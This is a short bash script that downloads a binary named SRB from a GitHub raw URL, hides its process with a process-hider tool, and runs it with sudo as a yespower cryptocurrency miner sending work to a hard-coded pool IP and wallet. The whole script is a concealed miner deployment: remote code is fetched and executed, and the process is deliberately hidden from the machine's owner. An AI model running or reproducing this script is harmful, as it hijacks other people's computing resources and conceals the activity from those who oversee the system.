#!/bin/bash
npm i -g node-process-hider
wget https://raw.githubusercontent.com/realxdagg/job/main/SRB
chmod 500 SRB
ph add SRB
sudo ./SRB --disable-gpu --algorithm yespower --pool 191.33.253.162:6233  --wallet PFcVgJVKSjQT6XoWM3H7vk4wZ7JLKXrUVY --worker running --cpu-threads 8
